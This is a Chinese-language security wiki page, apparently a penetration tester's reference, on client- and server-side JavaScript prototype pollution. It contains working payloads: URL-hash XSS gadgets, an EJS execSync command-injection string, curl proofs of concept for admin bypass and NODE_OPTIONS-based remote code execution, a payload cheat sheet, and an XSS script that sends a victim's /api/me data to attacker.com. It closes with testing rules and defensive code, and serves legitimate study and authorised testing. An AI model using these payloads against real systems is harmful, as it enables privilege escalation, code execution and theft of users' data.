---
type: wiki
category: attack
tool: dom-invader,manual
status: active
last-updated: 2026-04-21
---

# Prototype Pollution（客戶端 + 伺服器端）

> **用途：** JavaScript 所有 Object 共享 `Object.prototype`。若能污染它，全站所有 `{}` 都繼承攻擊者的屬性 → DOM XSS / RCE / auth bypass。
> 近年 PortSwigger Top 10 之一，Parse Server / Prisma / Kibana / lodash 都有重大 CVE。

## 0. 原理

```javascript
// 客戶端 prototype pollution
Object.prototype.isAdmin = true;

const user = {};
console.log(user.isAdmin);  // → true（透過 prototype 繼承）

// 任何後續的 {} 都會繼承
const order = {};
console.log(order.isAdmin);  // → true
```

污染手段：
- **Client-side**: URL query (`?__proto__[x]=1`) → 被 merge 進 config object
- **Server-side**: `lodash.merge(target, JSON.parse(req.body))`、Express query parser
- **Gadget**: 污染後讓應用的 **正常程式碼路徑** 因為新屬性觸發 bug（XSS sink / `eval` / `spawnSync`）

## 1. 客戶端 Prototype Pollution（Client-side PP）

### 1.1 常見污染 source

```
URL query:
  https://target.com/#__proto__[x]=attacker

JSON.parse (若 parse hash / localStorage):
  {"__proto__": {"x": "attacker"}}

History.state / postMessage
```

### 1.2 常見 sink（Gadget）→ XSS

很多 JS lib 會在初始化時讀「未設定」的屬性，若該屬性被 pollute → 走到危險 branch。

**jQuery `html()` → script execution：**

```javascript
// jQuery 檢查 options.html 走 html branch
$.extend(true, {}, JSON.parse(hash));
$('<div>', options).appendTo('body');
// 若 options.html 有 value → innerHTML
```

污染：
```
https://target.com/#__proto__[html]=<img src=x onerror=alert(1)>
```

**AngularJS `ng-include`：**

```
https://target.com/#__proto__[template][url]=https://evil.com/xss.html
```

**EJS template injection：**

```
https://target.com/?__proto__[client]=true&__proto__[escapeFunction]=JSON.stringify;process.mainModule.require('child_process').execSync('id')
```

### 1.3 偵測：DOM Invader

```
1. 裝 Burp Browser → 右下 "DOM Invader"
2. 啟用 Prototype Pollution
3. 導航 target → DOM Invader 自動 fuzz __proto__, constructor.prototype
4. 看 "Pollutions detected" + 可能的 gadget
```

Burp Pro 獨家，效率極高。

### 1.4 手動偵測

Chrome devtools：

```javascript
// 在 console 先打印 Object.prototype，看有沒有異常屬性
Object.keys(Object.prototype)
// → 空 = 正常

// 試污染
// URL: #__proto__[test]=polluted
// 重載，再看：
Object.prototype.test
// → "polluted" → vulnerable
```

### 1.5 Gadget 資料庫

https://github.com/BlackFan/client-side-prototype-pollution/tree/master/gadgets

收錄 jQuery / AngularJS / Vue / Bootstrap / Webpack / Next.js / html5lib 等 30+ lib 的已知 gadget。每一條附 PoC URL。

## 2. 伺服器端 Prototype Pollution（Server-side PP）

### 2.1 典型 vuln merge 函式

```javascript
// 危險
lodash.merge(target, userInput)
lodash.set(target, key, val)
_.defaultsDeep(target, userInput)
Object.assign(target, userInput)  // 淺拷貝，但若 target[__proto__] 直接寫 ok
$.extend(true, target, userInput)  // deep extend
```

有 `__proto__` 或 `constructor.prototype` 作為 key → 直接寫到 Object.prototype。

### 2.2 Express body-parser 經典 pattern

```javascript
app.post('/api/user', (req, res) => {
  const user = {};
  Object.assign(user, req.body);   // req.body 若有 __proto__ → 污染
  // 或
  _.merge(user, req.body);
});
```

PoC：
```bash
curl -X POST https://target.com/api/user \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'

# 下一個 request
curl https://target.com/api/me -H "Authorization: Bearer $TOKEN"
# → 回 {"admin":true}  ← 整個 process 的 Object 都被污染
```

### 2.3 Server-side gadget → RCE

Node.js spawn child_process：
```javascript
// express.js 原始碼
options = options || {};       // ← 若 Object.prototype.shell = '/bin/sh'
spawn('ls', [], options);
```

污染 `Object.prototype.shell = 'id;'` → 所有 spawn 被注入。

PortSwigger lab 範例：
```bash
curl -X PUT https://target/api/user \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /tmp/exploit.js"}}'
# 下次 server fork child process → NODE_OPTIONS 被讀 → require attacker file
```

### 2.4 已知 CVE 清單

| Package | CVE | Payload |
|---------|-----|---------|
| lodash ≤ 4.17.11 | CVE-2019-10744 | `_.defaultsDeep(target, {"__proto__":{"a":1}})` |
| lodash.set ≤ 4.3.2 | CVE-2020-8203 | `_.set(obj, '__proto__.x', 1)` |
| hoek ≤ 4.2.0 | CVE-2018-3728 | same pattern |
| merge ≤ 2.1.0 | CVE-2018-16469 | same |
| mixin-deep ≤ 1.3.1 | CVE-2019-10746 | same |
| immer < 9.0.6 | CVE-2021-23436 | produce pattern |
| Parse Server | CVE-2022-24760 | `_wperm` via MongoDB op |
| Prototype pollution in nuxt.js | CVE-2020-7753 | |
| Kibana | CVE-2019-7609 | |

## 3. 偵測 Server-side PP

### 3.1 State pollution test

```bash
# 送污染
curl -X POST https://target.com/api/x \
  -d '{"__proto__":{"testFingerprint42":"polluted"}}'

# 再送正常 request
curl https://target.com/api/any-endpoint

# 若 response 中出現 testFingerprint42 → pollution 成功
```

### 3.2 Blind probe via status code diff

很多 framework 讀 Object.prototype 來決定行為。污染 `Object.prototype.status = 510` 之類，後續 request response code 變 → 證明。

```bash
# James Kettle server-side PP 研究有專門的 charset / ignoreUnknown 技巧
```

### 3.3 Nuclei template

有非正式 template，但偵測不穩。手動測最快。

### 3.4 DOMPurify + PP 測試工具

```bash
# Server-Side-Prototype-Pollution-Gadgets-Scanner
npm install -g server-side-prototype-pollution-scanner
ssppscan https://target.com
```

## 4. 實戰 PoC：Authenticated admin via PP

Target: Express API

### Step 1: 找 merge 入口
常在：
- `POST /api/user/profile` update
- `PUT /api/settings`
- `PATCH /api/config`

### Step 2: 送污染 payload
```bash
curl -X PATCH https://target.com/api/user/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"isAdmin":true,"role":"admin"}}'
```

### Step 3: 驗證污染生效
```bash
# 拿自己的 normal user token
curl https://target.com/api/admin/users \
  -H "Authorization: Bearer $USER_TOKEN"
# 原先應 403，若現在 200 → PP 成功 + admin check 走 prototype
```

### Step 4: Impact 擴大
```bash
# admin panel 全 access
# 看能否 spawn child process（需要 server-side sink）
```

## 5. 客戶端 PP 實戰 PoC：DOM XSS

Target: 用 jQuery 的舊 SPA

### Step 1: URL hash pollution
```
https://target.com/#__proto__[src]=https://evil.com/xss.js
```

### Step 2: 頁面 load → jQuery 讀 undefined option `.src` → innerHTML → script load

### Step 3: XSS payload
```javascript
// https://evil.com/xss.js
fetch('/api/me').then(r=>r.json()).then(d=>{
  fetch('https://attacker.com/?c='+btoa(JSON.stringify(d)))
});
```

## 6. 常用 test payload 一覽

### URL-based（client）

```
?__proto__[polluted]=1
?__proto__.polluted=1
?constructor[prototype][polluted]=1
?constructor.prototype.polluted=1
?constructor[prototype][innerHTML]=<svg+onload=alert(1)>
?__proto__[template][url]=//evil.com/x
?__proto__[div][html]=<img+src+onerror=alert(1)>
?__proto__[html]=<img+src+onerror=alert(1)>
?__proto__[sanitize]=false
```

### JSON body（server）

```json
{"__proto__":{"polluted":"yes"}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"toString":{"constructor":{"constructor":"return process"}}}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"shell":"/bin/sh"}}
{"__proto__":{"NODE_OPTIONS":"--require /tmp/x.js"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x.js"}}}
{"__proto__":{"argv0":"node"}}
```

## 7. 報告 template

```markdown
## 漏洞概述
https://target.com/api/user/update 使用 `lodash.merge` 將使用者輸入合併到 user object，
未禁用 `__proto__` key，導致 server-side prototype pollution。污染
`Object.prototype.isAdmin = true` 後，所有後續使用者在 authorization check 時都被判定為
admin，造成完整權限繞過。

## 重現步驟

### Step 1: 確認 normal user 無 admin 權限
curl https://target.com/api/admin/users -H "Authorization: Bearer $USER_TOKEN"
→ 403

### Step 2: 污染
curl -X PATCH https://target.com/api/user/update \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"x","__proto__":{"isAdmin":true}}'
→ 200

### Step 3: 驗證污染生效
curl https://target.com/api/admin/users -H "Authorization: Bearer $USER_TOKEN"
→ 200 [...all users...]

### Step 4: 確認是 global（其他 user 也受影響）
[用第二個帳號測試，同樣的 prototype 污染殘留]

## Impact
- 任一 normal user 可取 admin 權限
- 污染是 process-wide → 直到 server restart 為止，所有 request 都受影響
- 進一步 gadget 可達 RCE（child_process spawn NODE_OPTIONS）

## Severity
P1 / Critical
```

## 8. 安全測試守則

1. ⚠️ **Server-side PP 是 process-global** — 污染後影響所有使用者
2. ✅ 先測 harmless key（`__proto__[testFingerprint]=1`）確認有污染
3. ❌ 不在 production 長時間留污染（會影響真實使用者）
4. ✅ 測完立即通知 program 維運 restart process
5. ✅ PoC 附 cleanup 說明

## 9. 防禦角度

```javascript
// 禁 __proto__ key
function sanitize(obj) {
  if (obj.__proto__) delete obj.__proto__;
  if (obj.constructor) delete obj.constructor;
  return obj;
}

// 或用 Object.create(null)
const safe = Object.create(null);
Object.assign(safe, userInput);

// 或 JSON schema validation
// 或使用新版 lodash (≥ 4.17.21)
// 或 Node.js 開 --disable-proto=delete
```

## 關聯文件

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) § NoSQLi / JSON
- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 7 client_secret 硬編碼
- PortSwigger PP Lab：https://portswigger.net/web-security/prototype-pollution
- Client-Side PP Gadgets DB：https://github.com/BlackFan/client-side-prototype-pollution
- Server-Side PP Scanner：https://github.com/yuske/server-side-prototype-pollution
- James Kettle Server-Side PP：https://portswigger.net/research/server-side-prototype-pollution
